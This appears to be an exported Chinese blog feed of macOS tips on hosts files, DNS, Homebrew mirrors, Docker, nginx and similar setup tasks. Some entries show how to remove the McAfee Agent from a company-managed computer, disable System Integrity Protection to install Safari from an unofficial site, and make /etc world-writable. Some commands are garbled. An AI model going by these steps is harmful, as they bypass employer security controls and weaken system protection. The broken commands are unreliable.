<p><img src="https://upload-images.jianshu.io/upload_images/10024246-7bf8749a01353aac.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p>
<p>　　第二步、接下来请按快捷键组合 Shift+Command+G 三个组合按键查找文件，并输入 Hosts 文件的所在路径：/etc/hosts ，如图所示：</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-8af91772eae318b4.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p>
<p>　　第三步、在打开的文件夹当中找到「Hosts」文件夹。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-d249d67354796e5f.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p>
<p>　　第四步、复制这个「hosts」文件到桌面上，鼠标右键点击/右击它，选择「打开方式」—「文本编辑」，打开这个「hosts」文件，然后将你要修改的内容直接在里面修改就好了。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-a60eca4f5ebbdbe7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p>
<p>　　第五步、将你修改好的 hosts 文件在复制回 Hosts 文件的所在（文件夹下）路径：/etc/hosts 之下替换原始的 hosts 文件就好了，这样你 Mac 系统下的 hosts 文件就被成功修改了。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-7f4fe79c935b1b22.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p>
<p>　　3、使用 cat 命令合并文件</p>
<p>　　这个方法比较适合当你想往 Hosts 文件中添加一些内容的情况，首先你需要把需要添加到 Hosts 文件中的内容保存为一个TXT文本文件（建议直接保存在你的用户目录），我这里拿保存在用户目录中的123.txt为例说明。</p>
<p>　　同样是启动终端，然后运行下面两条命令：</p>
<p>　　sudo -s</p>
<p>　　cat ~/123.txt/etc/hosts</p>
<p>　　~ 符号在 Mac 甚至所有基于 Unix 和 Linux 的系统中都是代表当前用户的用户目录，.代表当前目录，这回你就应该明白上面的命令中为什么是 ~/123.txt 了吧。</p>
<p>　　4、直接在图形界面中修改</p>
<p>　　打开 Finder，然后点击菜单栏中的 前往——前往文件夹（或者快捷键 Shift+Command+G），在路径中输入 /private，进入之后在 etc 文件夹上点击右键——显示简介，在文件夹简介窗口的最下面找到“共享与权限”，将 everyone 的权限修改为“读与写”，如果你发现不能修改的话，将右下角的那把小锁解开就可以修改了。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-0847ef6d184c1f5d.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p>
<p>　　修改 etc 文件夹的权限之后，再进入 etc 文件夹下面，修改名为 hosts 文件的权限（同样是everyone读与写），修改完成之后，你就可以直接在 hosts 文件上点右键，通过“文本编辑”打开并编辑该文件了，不会出现没有权限的提示。修改并保存完成之后，记得将该文件和 etc 文件夹的权限还原。</p>
]]></content>
      <categories>
        <category>mac</category>
      </categories>
  </entry>
  <entry>
    <title>Mac-：修改-DNS-及清除-DNS-缓存</title>
    <url>/nirvana/mac/mac/Mac-%EF%BC%9A%E4%BF%AE%E6%94%B9-DNS-%E5%8F%8A%E6%B8%85%E9%99%A4-DNS-%E7%BC%93%E5%AD%98/</url>
    <content><![CDATA[<ul>
<li><ol>
<li><p>在苹果菜单选择 “系统偏好设置”。</p>
<p>   <img src="https://upload-images.jianshu.io/upload_images/10024246-134910c4b8f7de46.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
</li>
</ol>
</li>
<li><ol>
<li> 单击 “网络” 图标。</li>
</ol>
</li>
</ul>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-edd411652e2d5024.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<ul>
<li><ol>
<li> 从列表中选择想要修改或当前正在使用的网络连接服务（例如 WI-FI 或以太网），然后点击 “高级”。</li>
</ol>
</li>
</ul>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-33b002edbd8a3a66.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<ul>
<li><ol>
<li> 选择 DNS 标签，单击 “DNS 服务器” 左下角的 “+”，添加 119.29.29.29 和 114.114.114.114，然后单击右下角的 “好”。<br><img src="https://upload-images.jianshu.io/upload_images/10024246-f1ecd48ae2e2e8c1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></li>
</ol>
</li>
</ul>
<h2 id="还原-OS-X-中的-DNS-缓存设置"><a href="#还原-OS-X-中的-DNS-缓存设置" class="headerlink" title="还原 OS X 中的 DNS 缓存设置"></a>还原 OS X 中的 DNS 缓存设置</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">了解如何还原（清空）DNS 缓存设置。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>关于 DNS 缓存</p>
</blockquote>
<p>OS X 会将已解析的 DNS 查询的本地缓存保留一段时间，保留时间由 DNS 服务器定义。</p>
<p>有时可能需要立即还原缓存设置并重新查询 DNS 服务器。</p>
<p>例如，如果您是网络或服务器管理员且您的 DNS 服务器上的条目最近有更改，您可能需要执行此操作。</p>
<p>如果您的 Mac 使用的不是您服务器上的最新 DNS 条目，您可重新启动 Mac 以更新其缓存的信息。</p>
<p>如果您需要更新使用 OS X 的服务器上的 DNS 条目但又不能重新启动服务器，请使用以下适用于您所使用的 OS X 版本的命令。</p>
<blockquote>
<p>［应用程序］-［实用工具］-［终端］</p>
</blockquote>
<h2 id="OS-X-Yosemite-及更新机型"><a href="#OS-X-Yosemite-及更新机型" class="headerlink" title="OS X Yosemite 及更新机型"></a>OS X Yosemite 及更新机型</h2><blockquote>
<p>在 OS X v10.10.4 或更高版本中，请使用以下 “终端” 命令来还原 DNS 缓存设置：</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo killall -HUP mDNSResponder</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>在 OS X v10.10 至 v10.10.3 中，请使用以下 “终端” 命令来还原 DNS 缓存设置：</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo discoveryutil mdnsflushcache</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="OS-X-Mavericks、Mountain-Lion-和-Lion"><a href="#OS-X-Mavericks、Mountain-Lion-和-Lion" class="headerlink" title="OS X Mavericks、Mountain Lion 和 Lion"></a>OS X Mavericks、Mountain Lion 和 Lion</h2><p>在 OS X v10.9.5 及更低版本中，请使用以下 “终端” 命令来还原 DNS 缓存设置：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo killall -HUP mDNSResponder</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>Mac OS X Snow Leopard</p>
</blockquote>
<p>在 OS X v10.6 至 v10.6.8 中，请使用以下 “终端” 命令来还原 DNS 缓存设置：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo dscacheutil -flushcache</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>  DNS 清除缓存方法来自：<a href="https://support.apple.com/zh-cn/HT202516">苹果官网</a></li>
<li>  DNS 修改图片来自：<a href="https://support.dnspod.cn/Kb/showarticle/tsid/240/#link1">DNSPOD</a></li>
</ul>
]]></content>
      <categories>
        <category>mac</category>
      </categories>
  </entry>
  <entry>
    <title>Mac-效率工具软件-OpenInTerminal</title>
    <url>/nirvana/mac/mac/Mac-%E6%95%88%E7%8E%87%E5%B7%A5%E5%85%B7%E8%BD%AF%E4%BB%B6-OpenInTerminal/</url>
    <content><![CDATA[<p>软件是以 Finder 的扩展形式存在的，安装后你并不会在 Applications 文件夹中看到它。</p>
<h4 id="总结来说有三点"><a href="#总结来说有三点" class="headerlink" title="总结来说有三点"></a>总结来说有三点</h4><ul>
<li>可以快速从终端（Terminal）中打开某个目录</li>
<li>可以快速用编辑器打开某个目录或者文件</li>
<li>可以复制某个文件或者目录的路径<br><img src="https://upload-images.jianshu.io/upload_images/10024246-4dcfaae0ade1f4a7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br><img src="https://upload-images.jianshu.io/upload_images/10024246-ce3c7903db535631.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><h2 id="如何安装🖥"><a href="#如何安装🖥" class="headerlink" title="如何安装🖥"></a>如何安装🖥</h2></li>
</ul>
<h3 id="1-下载"><a href="#1-下载" class="headerlink" title="1. 下载"></a>1. 下载</h3><h4 id="a-Homebrew"><a href="#a-Homebrew" class="headerlink" title="a) Homebrew"></a>a) Homebrew</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">brew install --cask openinterminal</span><br></pre></td></tr></table></figure>

<h4 id="b-手动"><a href="#b-手动" class="headerlink" title="b) 手动"></a>b) 手动</h4><ol>
<li> 从 <a href="https://github.com/Ji4n1ng/OpenInTerminal/releases">release</a> 中下载。</li>
<li> 将应用移动到 <code>应用程序</code> 文件夹。</li>
</ol>
<blockquote>
<p>⚠️当您第一次运行应用程序时，macOS 将要求访问 <code>访达</code> 和 <code>终端</code>（或 <code>iTerm</code>）的权限。请给予应用程序权限。</p>
</blockquote>
<h3 id="2-打开-Finder-扩展权限"><a href="#2-打开-Finder-扩展权限" class="headerlink" title="2. 打开 Finder 扩展权限"></a><a href="https://github.com/Ji4n1ng/OpenInTerminal/blob/master/Resources/README-zh.md#2-%E6%89%93%E5%BC%80-finder-%E6%89%A9%E5%B1%95%E6%9D%83%E9%99%90"></a>2. 打开 Finder 扩展权限</h3><p>打开 OpenInTerminal 应用。去 <code>系统偏好设置</code> -&gt; <code>扩展</code> -&gt; <code>访达扩展</code>，打开下图中的权限按钮。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-1f143a78e0bf16ca.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
]]></content>
      <categories>
        <category>mac</category>
      </categories>
  </entry>
  <entry>
    <title>Mac教程：如何删除-DS_Store文件且不再生</title>
    <url>/nirvana/mac/mac/Mac%E6%95%99%E7%A8%8B%EF%BC%9A%E5%A6%82%E4%BD%95%E5%88%A0%E9%99%A4-DS_Store%E6%96%87%E4%BB%B6%E4%B8%94%E4%B8%8D%E5%86%8D%E7%94%9F/</url>
    <content><![CDATA[<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.DS_Store文件重新生成非常令人困扰，我们可以用终端命令简单的处理掉。</span><br></pre></td></tr></table></figure>
<p>　　在 Mac OS X 系统下，几乎绝大部分文件夹中都包含 .DS_Store 隐藏文件，这里保存着针对这个目录的特殊信息和设置配置，例如查看方式、图标大小以及这个目录的一些附属元数据。<br>       而在 OS X 系统中，这些文件是默认隐藏起来的，但是当我们将这些文件转移共享到 Windows 系统的时候，它们就会变成可见状态，并且看起来非常像是一些垃圾文件。<br>　　许多用户会选择在 Windows 系统中将这些 .DS_Store 文件删除，但是它们会重新生成，这一点非常令人困扰。对于这个问题，我们可以用终端命令简单的处理掉，并且防止 DS_Store 文件的再生。</p>
<p>　　我们需要打开终端窗口，并输入删除命令：sudo find / -name “.DS_Store” -depth -exec rm {} ;</p>
<p>　　按下回车键盘之后，终端会提示用户名和密码，直接输入密码再按回车即可。</p>
<p>　　删除后继续在终端输入：defaults write com.apple.desktopservices DSDontWriteNetworkStores true</p>
<p>　　然后按下回车，就可以防止 .DS_Store 文件的再生了。</p>
]]></content>
      <categories>
        <category>mac</category>
      </categories>
  </entry>
  <entry>
    <title>McAfee-Agent-占用8081-端口号</title>
    <url>/nirvana/mac/mac/McAfee-Agent-%E5%8D%A0%E7%94%A88081-%E7%AB%AF%E5%8F%A3%E5%8F%B7/</url>
    <content><![CDATA[<p>公司电脑被标装，McAfee Agent关不掉</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo lsof -n -i4TCP:8081</span><br><span class="line">sudo launchctl list | grep 5693</span><br><span class="line">sudo launchctl remove com.mcafee.agent.macmn</span><br></pre></td></tr></table></figure>

<p>如果需要暂时禁用mac上装的mcafee，可以在命令行里先su到之前有管理员权限的账户，然后跑命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo &#x2F;usr&#x2F;local&#x2F;McAfee&#x2F;AntiMalware&#x2F;VSControl stopoas</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>mac</category>
      </categories>
  </entry>
  <entry>
    <title>OSX---降级Safari-12到11-1-2</title>
    <url>/nirvana/mac/mac/OSX---%E9%99%8D%E7%BA%A7Safari-12%E5%88%B011-1-2/</url>
    <content><![CDATA[<h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Pacifist : https:&#x2F;&#x2F;www.charlessoft.com&#x2F;cgi-bin&#x2F;pacifist_download.cgi?type&#x3D;zip</span><br></pre></td></tr></table></figure>

<h4 id="Safari-11"><a href="#Safari-11" class="headerlink" title="Safari 11"></a>Safari 11</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.newasp.net&#x2F;soft&#x2F;109641.html</span><br></pre></td></tr></table></figure>

<h4 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 . 重启系统, 按住⌘-R不松手</span><br><span class="line">2 . 在实用工具(Utilities)下打开终端,输入csrutil disable, 然后回车; 你就看到提示系统完整性保护(SIP: System Integrity Protection)已禁用</span><br><span class="line">3 . 输入reboot回车重启电脑</span><br><span class="line">4 . 打开Pacifist, 点击 打开Safari 11.1.软件包, 选择Safari 11.1.2包的内容,点击安装按钮;</span><br><span class="line">5 . 给予管理员权限, 并一路替换,就可以了</span><br><span class="line">6 . 如果你想启用SIP, 那么重启启动系统,按住⌘-R不松手; 输入csrutil enable回车.开启SIP</span><br></pre></td></tr></table></figure>

<h4 id="使用pacifist安装safari"><a href="#使用pacifist安装safari" class="headerlink" title="使用pacifist安装safari"></a>使用pacifist安装safari</h4><p><img src="http://upload-images.jianshu.io/upload_images/10024246-137076307d06f5c0.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 . 一旦升级到 mojave 版本,是不能降级到 safari11.1.2版本的.</span><br><span class="line">2 . 如果这么操作怎么都不成功, 完全卸载 safari 再直接安装吧.</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>mac</category>
      </categories>
  </entry>
  <entry>
    <title>macOS-High-Sierra-修复部分Wineskin游戏无法正常运行的问题</title>
    <url>/nirvana/mac/mac/macOS-High-Sierra-%E4%BF%AE%E5%A4%8D%E9%83%A8%E5%88%86Wineskin%E6%B8%B8%E6%88%8F%E6%97%A0%E6%B3%95%E6%AD%A3%E5%B8%B8%E8%BF%90%E8%A1%8C%E7%9A%84%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>之前，有很多朋友留言小子因为系统升级到了最新macOS High Sierra而无法打开博客下载的Wineskin移植游戏了。<br>相信所有升级到macOS High Sierra的朋友运行wineskin wrapper移植的游戏都会遇到这个问题。不过，小子经过一番搜索，终于找到了解决办法，测试有效，现在分享给大家。<br><img src="https://upload-images.jianshu.io/upload_images/10024246-d046d690278a285e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>小子简单说明下具体步骤（这里以“太阁立志传 V”为例）：<br>1.右键“太阁立志传 V.app”显示包内容，双击打开“Wineskin.app”，点击Advanced—Tools；<br>2.先点击“kill Wineskin Processes”, 关闭所有进程；<br><img src="https://upload-images.jianshu.io/upload_images/10024246-1e2e98550a078858.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>3.点击最下方中间的“Set Screen Options”,将“Use Mac Driver instead of X11”勾上 将“Auto Detect GPU infor for Direct3D”的勾选去掉，点击“done”；<br><img src="https://upload-images.jianshu.io/upload_images/10024246-1c32a5f16dd885e3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>4.回到tools菜单，点击“Winetricks”，搜索关键字“video”，展开“settings”，勾选第二个“videomemorysize=2048”，点击“Run”确认wrapper已经更改设置，关闭Wine；<br><img src="https://upload-images.jianshu.io/upload_images/10024246-c0701d46eaa676bb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>5.Have done！</p>
]]></content>
      <categories>
        <category>mac</category>
      </categories>
  </entry>
  <entry>
    <title>mac-brew安装node-管理工具n</title>
    <url>/nirvana/mac/mac/mac-brew%E5%AE%89%E8%A3%85node-%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7n/</url>
    <content><![CDATA[<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">brew install n</span><br></pre></td></tr></table></figure>
<h2 id="安装-激活版本"><a href="#安装-激活版本" class="headerlink" title="安装/激活版本"></a>安装/激活版本</h2><p>只需执行n <version>即可安装node。如果<version>已经安装（通过n），n将激活该版本。<br>例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ n 10.0.1</span><br><span class="line">$ n 16.9.1</span><br></pre></td></tr></table></figure>
<p>n单独执行是查看当前安装的版本，使用向上和向下箭头键导航并按enter或右箭头键进行选择，使用^ C（控制+ C）退出选择屏幕。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ n</span><br><span class="line"> </span><br><span class="line">  10.8.14</span><br><span class="line">ο 10.8.17</span><br><span class="line">  10.9.6</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>mac</category>
      </categories>
  </entry>
  <entry>
    <title>macOS-安装-Docker</title>
    <url>/nirvana/mac/mac/macOS-%E5%AE%89%E8%A3%85-Docker/</url>
    <content><![CDATA[<h1 id="macOS"><a href="#macOS" class="headerlink" title="macOS"></a>macOS</h1><h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>系统要求<a href="https://yeasy.gitbook.io/docker_practice/install/mac#xi-tong-yao-qiu"></a></p>
<p><a href="https://docs.docker.com/docker-for-mac/">Docker Desktop for Mac</a> 要求系统最低为 macOS Mojave 10.14。</p>
<h1 id="-1"><a href="#-1" class="headerlink" title=""></a></h1><p>安装<a href="https://yeasy.gitbook.io/docker_practice/install/mac#an-zhuang"></a></p>
<h2 id="-2"><a href="#-2" class="headerlink" title=""></a></h2><p>使用 Homebrew 安装<a href="https://yeasy.gitbook.io/docker_practice/install/mac#shi-yong-homebrew-an-zhuang"></a></p>
<p><a href="https://brew.sh/">Homebrew</a> 的 <a href="https://github.com/Homebrew/homebrew-cask">Cask</a> 已经支持 Docker Desktop for Mac，因此可以很方便的使用 Homebrew Cask 来进行安装：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ brew cask install docker</span><br></pre></td></tr></table></figure>
<h2 id="手动下载安装"><a href="#手动下载安装" class="headerlink" title="手动下载安装"></a>手动下载安装</h2><p>如果需要手动下载，请点击以下链接下载 <a href="https://download.docker.com/mac/stable/Docker.dmg">Stable</a> 或 <a href="https://download.docker.com/mac/edge/Docker.dmg">Edge</a> 版本的 Docker Desktop for Mac。</p>
<p>如同 macOS 其它软件一样，安装也非常简单，双击下载的 <code>.dmg</code> 文件，然后将那只叫 <a href="https://www.docker.com/blog/call-me-moby-dock/">Moby</a> 的鲸鱼图标拖拽到 <code>Application</code> 文件夹即可（其间需要输入用户密码）。<br><img src="https://upload-images.jianshu.io/upload_images/10024246-ed67d3f5d80f1b0a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<h1 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h1><p>从应用中找到 Docker 图标并点击运行。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-53121fff4bb2948c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>运行之后，会在右上角菜单栏看到多了一个鲸鱼图标，这个图标表明了 Docker 的运行状态。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-23ece114e822f25d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>每次点击鲸鱼图标会弹出操作菜单。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-b9ea98917ad76fe3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>之后，你可以在终端通过命令检查安装后的 Docker 版本。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ docker --version</span><br><span class="line"></span><br><span class="line">Docker version 19.03.8, build afacb8b</span><br><span class="line"></span><br><span class="line">$ docker-compose --version</span><br><span class="line"></span><br><span class="line">docker-compose version 1.25.5, build 8a1c60f6</span><br></pre></td></tr></table></figure>

<p>如果 <code>docker version</code>、<code>docker info</code> 都正常的话，可以尝试运行一个 <a href="https://hub.docker.com/_/nginx/">Nginx 服务器</a>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ docker run -d -p 80:80 --name webserver nginx</span><br></pre></td></tr></table></figure>

<p>服务运行后，可以访问 <a href="http://localhost/">http://localhost</a>，如果看到了 “Welcome to nginx!”，就说明 Docker Desktop for Mac 安装成功了。<br><img src="https://upload-images.jianshu.io/upload_images/10024246-0e37b4c4c52d946a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
<p>要停止 Nginx 服务器并删除执行下面的命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ docker stop webserver</span><br><span class="line"></span><br><span class="line">$ docker rm webserver</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="镜像加速"><a href="#镜像加速" class="headerlink" title="镜像加速"></a>镜像加速</h1><p>如果在使用过程中发现拉取 Docker 镜像十分缓慢，可以配置 Docker <a href="https://yeasy.gitbook.io/docker_practice/install/mirror">国内镜像加速</a>。</p>
<h1 id="-3"><a href="#-3" class="headerlink" title=""></a></h1><p>参考链接<a href="https://yeasy.gitbook.io/docker_practice/install/mac#can-kao-lian-jie"></a></p>
<ul>
<li>  <a href="https://docs.docker.com/docker-for-mac/install/">官方文档</a></li>
</ul>
]]></content>
      <categories>
        <category>mac</category>
      </categories>
  </entry>
  <entry>
    <title>macOS系统下安装Homebrew慢</title>
    <url>/nirvana/mac/mac/macOS%E7%B3%BB%E7%BB%9F%E4%B8%8B%E5%AE%89%E8%A3%85Homebrew%E6%85%A2/</url>
    <content><![CDATA[<h4 id="1-获取install文件并编辑"><a href="#1-获取install文件并编辑" class="headerlink" title="1.获取install文件并编辑"></a>1.获取install文件并编辑</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd ~</span><br><span class="line">curl -fsSL https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;Homebrew&#x2F;install&#x2F;master&#x2F;install &gt;&gt; brew_install</span><br></pre></td></tr></table></figure>

<blockquote>
<p>编辑的话直接在Finder里面搜索brew_install，双击之后打开，一般会用<strong>Xcode</strong>打开。原文说的“<strong>注释掉BREW_REPO = “<a href="https://github.com/Homebrew/brew&quot;.freeze%E5%92%8CCORE_TAP_REPO">https://github.com/Homebrew/brew&quot;.freeze和CORE_TAP_REPO</a> = “<a href="https://github.com/Homebrew/homebrew-core&quot;.freeze">https://github.com/Homebrew/homebrew-core&quot;.freeze</a></strong>”，新版没有<strong>CORE_TAP_REPO</strong>这一行，不过没关系，新增上去就行了。</p>
</blockquote>
<p><strong>修改后代码和截图如下</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;ruby</span><br><span class="line"># This script installs to &#x2F;usr&#x2F;local only. To install elsewhere (which is</span><br><span class="line"># unsupported) you can untar https:&#x2F;&#x2F;github.com&#x2F;Homebrew&#x2F;brew&#x2F;tarball&#x2F;master</span><br><span class="line"># anywhere you like.</span><br><span class="line">HOMEBREW_PREFIX &#x3D; &quot;&#x2F;usr&#x2F;local&quot;.freeze</span><br><span class="line">HOMEBREW_REPOSITORY &#x3D; &quot;&#x2F;usr&#x2F;local&#x2F;Homebrew&quot;.freeze</span><br><span class="line">HOMEBREW_CORE_TAP &#x3D; &quot;&#x2F;usr&#x2F;local&#x2F;Homebrew&#x2F;Library&#x2F;Taps&#x2F;homebrew&#x2F;homebrew-core&quot;.freeze</span><br><span class="line">HOMEBREW_CACHE &#x3D; &quot;#&#123;ENV[&quot;HOME&quot;]&#125;&#x2F;Library&#x2F;Caches&#x2F;Homebrew&quot;.freeze</span><br><span class="line">#BREW_REPO &#x3D; &quot;https:&#x2F;&#x2F;github.com&#x2F;Homebrew&#x2F;brew&quot;.freeze#修改前</span><br><span class="line">BREW_REPO &#x3D; &quot;git:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;brew.git&quot;.freeze#修改后</span><br><span class="line">CORE_TAP_REPO &#x3D; &quot;git:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;homebrew-core.git&quot;.freeze#新增</span><br></pre></td></tr></table></figure>

<p><img src="https://upload-images.jianshu.io/upload_images/10024246-03688f54a0acd5dc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<h4 id="2-开始安装"><a href="#2-开始安装" class="headerlink" title="2.开始安装"></a>2.开始安装</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;usr&#x2F;bin&#x2F;ruby ~&#x2F;brew_install</span><br></pre></td></tr></table></figure>

<blockquote>
<p>在这里我没有遇到原文下面提问的朋友遇到的卡住报错不动等问题，仅停顿了一会儿。</p>
</blockquote>
<h4 id="3-替换源"><a href="#3-替换源" class="headerlink" title="3.替换源"></a>3.替换源</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#替换homebrew默认源</span><br><span class="line">cd &quot;$(brew --repo)&quot;</span><br><span class="line">git remote set-url origin git:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;brew.git</span><br><span class="line"></span><br><span class="line">#替换homebrew-core源</span><br><span class="line">cd &quot;$(brew --repo)&#x2F;Library&#x2F;Taps&#x2F;homebrew&#x2F;homebrew-core&quot;</span><br><span class="line">git remote set-url origin git:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;homebrew-core.git</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="4-brew更新"><a href="#4-brew更新" class="headerlink" title="4.brew更新"></a>4.brew更新</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">brew update</span><br></pre></td></tr></table></figure>

<p><strong>最后:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#39;export HOMEBREW_BOTTLE_DOMAIN&#x3D;https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;homebrew-bottles&#39; &gt;&gt; ~&#x2F;.bash_profile</span><br><span class="line">source ~&#x2F;.bash_profile</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>mac</category>
      </categories>
  </entry>
  <entry>
    <title>mac下安装nginx</title>
    <url>/nirvana/mac/mac/mac%E4%B8%8B%E5%AE%89%E8%A3%85nginx/</url>
    <content><![CDATA[<p>安装工具：</p>
<p><a href="https://brew.sh/index_zh-cn.html">homebrew</a>（还没用过的小伙伴可以点链接进行了解或者自行百度）</p>
<p>步骤：</p>
<p>　　1、打开终端，习惯性命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">brew update</span><br></pre></td></tr></table></figure>
<p>//结果：Already up-to-date.</pre></p>
<p>　　2、终端继续执行命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">brew search nginx   &#x2F;&#x2F;查询要安装的软件是否存在</span><br></pre></td></tr></table></figure>

<p>　　3、这里我们多执行一步“废”命令，不过有利于我们后面的配置：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">brew info nginx</span><br></pre></td></tr></table></figure>

<p>　　运行结果：</p>
<p>　　<img src="https://upload-images.jianshu.io/upload_images/10024246-4c9ce6a852151bf0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>　　我们可以看到，nginx在本地还未安装（Not installed），nginx的来源（From），Docroot默认为/usr/local/var/www，在/usr/local/etc/nginx/nginx.conf配置文件中默认端口被配置为8080从而使nginx运行时不需要加sudo，nginx将在/usr/local/etc/nginx/servers/目录中加载所有文件，以及我们可以通过最简单的命令 ‘nginx’ 来启动nginx。</p>
<p>　　4、正式开始安装：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">brew install nginx</span><br></pre></td></tr></table></figure>

<p><img src="https://upload-images.jianshu.io/upload_images/10024246-de5daa8180b3f4c3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>　　5、查看nginx安装目录（是否如info所说）：　</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">open &#x2F;usr&#x2F;local&#x2F;etc&#x2F;nginx&#x2F;</span><br></pre></td></tr></table></figure>

<p>　　　　<img src="https://upload-images.jianshu.io/upload_images/10024246-90142c4098d678f3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>　　成功打开nginx目录，也可以看到如info所说servers目录以及nginx.conf的配置文件（后面会用到这个配置文件）。但我们并没有找到nginx被安装到了哪里。</p>
<p>　　终端继续执行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">open &#x2F;usr&#x2F;local&#x2F;Cellar&#x2F;nginx  &#x2F;&#x2F;其实这个才是nginx被安装到的目录</span><br></pre></td></tr></table></figure>

